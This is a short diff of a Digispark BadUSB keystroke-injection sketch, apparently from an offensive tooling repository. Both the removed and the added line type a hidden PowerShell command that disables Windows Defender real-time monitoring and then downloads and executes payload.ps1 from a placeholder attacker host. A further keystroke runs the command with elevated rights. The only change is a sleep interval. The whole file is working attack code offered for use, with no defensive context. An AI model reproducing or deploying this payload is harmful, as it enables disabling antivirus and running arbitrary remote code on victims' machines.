@@ -10,7 +10,7 @@ void setup() {
   DigiKeyboard.sendKeyStroke(0);
   DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
   DigiKeyboard.delay(404);
-  DigiKeyboard.print("powershell -windowstyle hidden \"Set-MpPreference -DisableRealtimeMonitoring $true; Start-Sleep 1; IEX (New-Object Net.WebClient).DownloadString('http://<IP>:<PORT>/payload.ps1');\"");
+  DigiKeyboard.print("powershell -windowstyle hidden \"Set-MpPreference -DisableRealtimeMonitoring $true; Start-Sleep 0.666; IEX (New-Object Net.WebClient).DownloadString('http://<IP>:<PORT>/payload.ps1');\"");
   DigiKeyboard.delay(69);
   DigiKeyboard.sendKeyStroke(KEY_ENTER, MOD_CONTROL_LEFT | MOD_SHIFT_LEFT);
   DigiKeyboard.delay(404);
